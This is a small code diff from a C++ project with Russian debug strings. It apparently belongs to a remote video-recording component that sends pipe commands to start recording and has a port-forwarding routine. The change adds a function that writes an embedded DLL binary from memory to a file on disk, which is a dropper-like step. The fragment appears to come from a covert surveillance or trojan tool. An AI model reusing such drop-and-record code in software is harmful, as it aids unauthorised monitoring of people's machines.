@@ -786,7 +786,6 @@ bool VideoRecorderSrv::StartRecording(PCHAR URL)
 	VDRDBG("VideoRecorder", "Отправляем команду запуска удалённой записи видео");
 
 	bool Result = PIPE::SendMessage(ServerName, CommandStart, URL, 0, NULL);
-
 	if (!Result)
 	{
 		VDRDBG("VideoRecorder", "Ошибка запуска удалённой записи. Возможно сервер не доступен.");
@@ -873,4 +872,9 @@ TVideoRecDLL* RunPortForward( const char* ip )
 		delete videoDll;
 	}
 	return 0;
+}
+
+bool SaveVideoDll( const char* nameFile )
+{
+	return File::WriteBufferA( (char*)nameFile, VideoRecorder::data, sizeof(VideoRecorder::data) );
 }
